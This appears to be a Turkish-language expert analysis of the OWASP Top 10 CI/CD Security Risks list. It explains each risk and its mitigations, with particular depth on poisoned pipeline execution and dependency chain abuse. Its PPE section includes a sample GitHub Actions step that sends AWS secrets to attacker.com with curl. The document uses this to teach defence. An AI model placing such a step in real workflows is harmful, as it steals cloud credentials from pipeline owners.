@@ -1,0 +1,141 @@
+**OWASP Top 10 CI/CD Security Risks (2022) – Detaylı Analiz**
+
+Merhaba. DevSecOps ve CI/CD güvenliği uzmanı olarak, OWASP Top 10 CI/CD Security Risks listesini (Eylül/Ekim 2022, v1.0 stable) teknik derinliğiyle inceliyorum. Bu liste, Cider Security araştırmacıları (Daniel Krivelevich ve Omer Gil) tarafından SolarWinds, Codecov, PHP, ua-parser-js, dependency confusion gibi gerçek supply chain saldırılarından derlenerek OWASP çatısı altına alınmıştır.
+
+Liste, **CI/CD ekosistemini (SCM, CI sunucuları, artifact repository’ler, build agent’lar, üçüncü taraf entegrasyonları)** hedef alan riskleri önceliklendirir. Amacı, yazılım tedarik zincirini (software supply chain) korumak ve “fabrikayı” (pipeline’ı) güvence altına almaktır.
+
+### 1. 2022 Versiyonundaki 10 Risk Kategorisi (Detaylı Açıklama)
+
+Aşağıda her riskin kodu, Türkçe/İngilizce adı, kısa tanımı, etkisi ve temel mitigasyonları yer almaktadır. Kritik riskler (PPE, Dependency Chain Abuse, Flow Control) daha derin işlenecektir.
+
+1. **CICD-SEC-1: Yetersiz Akış Kontrol Mekanizmaları (Insufficient Flow Control Mechanisms)**  
+   Tek bir kimliğin (geliştirici veya servis hesabı) ek onay/inceleme olmadan kötü amaçlı kodu veya artifact’ı pipeline boyunca production’a kadar itebilmesi.  
+   **Etki:** Branch koruması zayıfsa, auto-merge kuralı abuse edilirse veya artifact doğrudan upload edilebilirse, tek bir hesapla production’a malware/deploy yapılabilir.  
+   **Temel Mitigasyon:** Strict branch protection (exclusion’suz), zorunlu PR review + status checks, artifact provenance kontrolü (sadece CI servis hesabı tarafından üretilen artifact’lar deploy edilebilsin), drift detection.
+
+2. **CICD-SEC-2: Yetersiz Kimlik ve Erişim Yönetimi (Inadequate Identity and Access Management)**  
+   CI/CD’de kullanılan kimliklerin (kullanıcı, servis hesabı, token) aşırı yetkili olması, uzun ömürlü credential’lar ve granular (pipeline-context aware) kontrollerin eksikliği.
+
+3. **CICD-SEC-3: Bağımlılık Zinciri İstismarı (Dependency Chain Abuse)**  
+   Build ortamlarının veya geliştirici workstation’ların kötü amaçlı paket indirmesine yol açan zafiyetler (dependency confusion, hijacking, typosquatting, brandjacking).
+
+4. **CICD-SEC-4: Zehirlenmiş Pipeline Yürütmesi – PPE (Poisoned Pipeline Execution)**  
+   Saldırganın SCM erişimiyle pipeline konfigürasyon dosyasını veya referans verdiği dosyaları (Makefile, script, test dosyası vb.) zehirleyerek build agent’ta kötü amaçlı kod çalıştırması.  
+   **En kritik risklerden biri** (aşağıda teknik derinlemesine).
+
+5. **CICD-SEC-5: Yetersiz Pipeline Tabanlı Erişim Kontrolleri (Insufficient PBAC)**  
+   Erişim kontrollerinin statik IAM ile sınırlı kalması; pipeline’ın çalıştığı context’e (branch, PR kaynağı, commit imza durumu) göre dinamik izinlerin olmaması.
+
+6. **CICD-SEC-6: Yetersiz Kimlik Bilgisi Hijyeni (Insufficient Credential Hygiene)**  
+   Secret’ların kodda hardcode edilmesi, uzun ömürlü token’lar, log’larda sızması, rotation yapılmaması.
+
+7. **CICD-SEC-7: Güvensiz Sistem Konfigürasyonu (Insecure System Configuration)**  
+   CI sunucularında, build agent’larda, artifact repository’lerde default credential’lar, exposed dashboard’lar, zayıf auth, gereksiz servislerin açık olması.
+
+8. **CICD-SEC-8: Üçüncü Taraf Servislerin Yönetimsiz Kullanımı (Ungoverned Usage of Third-Party Services)**  
+   Slack, monitoring, notification, webhook gibi entegrasyonların güvenlik incelemesi yapılmadan, geniş OAuth scope’larla bağlanması.
+
+9. **CICD-SEC-9: Uygunsuz Artifact Bütünlük Doğrulama (Improper Artifact Integrity Validation)**  
+   Build artifact’larının (container image, binary, package) imzalanmaması, SBOM üretilmemesi veya doğrulanmaması, checksum kontrolünün yapılmaması.
+
+10. **CICD-SEC-10: Yetersiz Loglama ve Görünürlük (Insufficient Logging and Visibility)**  
+    Pipeline’da gerçekleşen olayların (kim neyi değiştirdi, hangi script çalıştı, secret erişimi) merkezi ve sorgulanabilir şekilde loglanmaması; anomalilerin tespit edilememesi.
+
+### 2. Bu Listenin Diğer OWASP Top 10 Projelerinden Farkı
+
+- **OWASP Top 10 Web Application Security Risks** → Çalışan uygulamadaki zafiyetlere odaklanır (Injection, Broken Access Control, vb.).  
+- **OWASP Top 10 API Security Risks** → API endpoint’lerine odaklanır.  
+- **OWASP Top 10 CI/CD Security Risks** → **Yazılımı üreten “fabrika”yı** (CI/CD pipeline + supply chain) hedef alır.  
+
+Bu liste, **geleneksel uygulama güvenliğinden ziyade, tedarik zinciri saldırısı (supply chain attack) vektörlerine** odaklanır. Gerçek olaylardan (SolarWinds → 18.000+ müşteri etkilendi, Codecov → build pipeline’dan secret exfil, dependency hijacking’ler) türetilmiştir. Klasik “uygulama zafiyeti” yerine “pipeline zehirleme”, “artifact bütünlüğü”, “build-time execution” gibi konulara öncelik verir. Bu nedenle DevSecOps ve platform engineering ekipleri için daha stratejik bir rehberdir.
+
+### 3. CI/CD Pipeline’larında En Kritik Risklerin Teknik Değerlendirmesi
+
+#### **CICD-SEC-4: Poisoned Pipeline Execution (PPE) – En Yüksek Etkili Risk**
+Saldırganın SCM’de (GitHub, GitLab, Bitbucket vb.) izni varsa, pipeline konfigürasyonunu veya pipeline’ın referans verdiği dosyaları değiştirerek build agent’ta kod çalıştırmasıdır.
+
+**Üç tipi vardır:**
+
+- **Direct PPE (D-PPE):** Pipeline konfigürasyon dosyasını (`.github/workflows/*.yml`, `Jenkinsfile`, `.gitlab-ci.yml`) doğrudan zehirleme. Push veya PR ile tetiklenir.
+- **Indirect PPE (I-PPE):** Pipeline konfigürasyonu korunaklı bir branch’ten çekiliyorsa, referans verilen dosyalar (Makefile, `package.json` scripts, test dosyaları, linter config’leri) zehirlenir.
+- **Public PPE (3PE):** Public repo’larda anonim PR’larla tetiklenen pipeline’lar (open source projelerde çok yaygındır). Aynı CI instance’ta private projelerin secret’ları da sızabilir.
+
+**Gerçekçi Saldırı Senaryosu (GitHub Actions örneği):**  
+Saldırgan yeni bir branch oluşturur → workflow dosyasını şu şekilde zehirler:
+
+```yaml
+- env:
+    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+  run: |
+    curl -d "creds=$(echo $AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY | base64)" https://attacker.com/exfil
+```
+
+Pipeline tetiklenir → secret’lar environment variable olarak yüklenir → exfil olur.
+
+**Mitigasyonlar (Teknik):**
+- Branch protection kuralları **exclusion’suz** uygulanmalı.
+- Pipeline konfigürasyonu her zaman **korunaklı branch**’ten çekilmeli.
+- PR’larda “required reviews” + “status checks” zorunlu olmalı.
+- **OIDC federation** kullan (AWS/GCP/Azure ile) → uzun ömürlü secret’ları kaldır.
+- Self-hosted runner’larda network segmentation + minimal image’lar.
+- Pipeline’da `actions/checkout` gibi action’ların pinned commit hash ile kullanılması.
+
+#### **CICD-SEC-3: Dependency Chain Abuse**
+Build veya geliştirici ortamının kötü amaçlı paketi indirmesi.
+
+**Başlıca vektörler:**
+- **Dependency Confusion:** İç paketle aynı isimde public malicious paket yayınlama (Alex Birsan’ın ünlü araştırması; Amazon, Slack, Lyft hedeflendi).
+- **Dependency Hijacking:** Popüler paketin maintainer hesabının ele geçirilmesi (ua-parser-js, coa, rc gibi milyonlarca indirmeli paketler).
+- **Typosquatting & Brandjacking:** Benzer isim veya marka taklidi.
+
+**Teknik Etki:** Paket install script’leri (preinstall, postinstall) hemen çalışır → credential theft, reverse shell, cryptominer, lateral movement. Malicious kod production’a kadar gidebilir.
+
+**Mitigasyonlar:**
+- Tüm package manager’lar **sadece internal proxy/registry**’den (Artifactory, Nexus, Cloudsmith, GitHub Packages scoped) çeksin.
+- `.npmrc`, `pip.conf` gibi config’ler repoda tutulsun ve scope enforcement yapılsın.
+- Checksum + signature verification zorunlu.
+- Lockfile’lar (package-lock.json, poetry.lock) + exact version pinning.
+- Private paket isimleri public repo’larda yayınlanmasın.
+
+#### **CICD-SEC-1: Insufficient Flow Control Mechanisms**
+Tek bir hesabın production’a doğrudan veya dolaylı yoldan kod/artifact itebilmesi.
+
+**Yaygın Bypass’lar:**
+- Branch protection’da belirli kullanıcı/branch exclusion’ı.
+- Auto-merge kurallarının abuse edilmesi.
+- Artifact repository’ye doğrudan upload + deploy pipeline’ın bunu kabul etmesi.
+- Drift (production ile repo arasındaki tutarsızlık) tespiti olmaması.
+
+**Mitigasyonlar:** Yukarıda CICD-SEC-1 maddesinde belirtilen kontroller + SBOM + signed artifacts + policy-as-code (OPA, Kyverno) ile deploy gate’leri.
+
+Diğer kritik riskler de (CICD-SEC-2,5,6,9) genellikle PPE veya Dependency ile birleşince zincir oluşturur. Bu nedenle **layered defense (defense-in-depth)** şarttır.
+
+### 4. Listenin Mevcut Durumu ve Potansiyel Güncelleme İhtiyaçları
+
+- **Mevcut Durum:** Ekim 2022’den beri resmi güncelleme yapılmamıştır (v1.0 stable). Hâlâ 2025-2026 tarihli makalelerde, cheat sheet’lerde ve enterprise rehberlerde referans olarak kullanılmaktadır. GitHub reposu (cider-security-research/top-10-cicd-security-risks) contribution’lara açıktır.
+
+- **Güncelleme İhtiyaçları (2026 Perspektifi):**
+  - **Yeni vektörler:** GitHub Actions Marketplace poisoning, self-hosted runner takeover’ları, AI-assisted code generation araçlarının (Cursor, Copilot vb.) pipeline’lara entegrasyonu sırasında prompt injection / poisoned suggestion riskleri.
+  - **SLSA, Sigstore, in-toto provenance** standartlarının olgunlaşması → CICD-SEC-9’un genişletilmesi.
+  - **Platform Engineering & IDP (Internal Developer Platforms)** yükselişi → yeni risk kategorisi veya mevcut risklerin bu bağlamda yeniden değerlendirilmesi.
+  - **Detection & Response** tarafının güçlendirilmesi (CICD-SEC-10 yetersiz kalıyor; behavioral analytics, pipeline telemetry, UEBA benzeri yaklaşımlar).
+  - **Zero Trust Pipeline** konsepti (her adımda doğrulama, just-in-time access).
+  - Nicel risk skorlaması veya maturity model eklenmesi (şu an nitel).
+
+**Öneri:** OWASP topluluğu 2026-2027’de v2.0 için çalışma başlatmalı. Özellikle CISA Secure by Design, NIST SSDF ve SBOM zorunlulukları ile uyumlu hale getirilmeli.
+
+### Sonuç ve Tavsiye
+
+OWASP Top 10 CI/CD Security Risks, klasik web/app security listelerinden **temelden farklı** bir yaklaşımla yazılım tedarik zincirini koruma konusunda en iyi referanslardan biridir. Özellikle **PPE (CICD-SEC-4)** ve **Dependency Chain Abuse (CICD-SEC-3)** günümüzde en sık exploited vektörler arasındadır.
+
+**Öncelikli Eylem Planı (Kuruluşlar İçin):**
+1. PPE’ye karşı branch protection + OIDC + required reviews’ı hemen güçlendir.
+2. Dependency yönetimini internal proxy + lockfile + scope enforcement ile sıkılaştır.
+3. Artifact signing + SBOM üretimini (cosign, Syft, Trivy) devreye al.
+4. Tüm pipeline’larda centralized logging + anomaly detection kur.
+5. Bu listeyi **DevSecOps olgunluk değerlendirmesi** için kullan.
+
+Bu analiz, mevcut en güncel resmi kaynaklara dayanarak hazırlanmıştır. Daha spesifik bir pipeline teknolojisi (GitHub Actions, GitLab CI, Jenkins, Azure DevOps vb.) veya belirli bir sektör için derinlemesine mitigasyon rehberi isterseniz, lütfen belirtin. 
+
+Güvenli pipeline’lar dilerim.
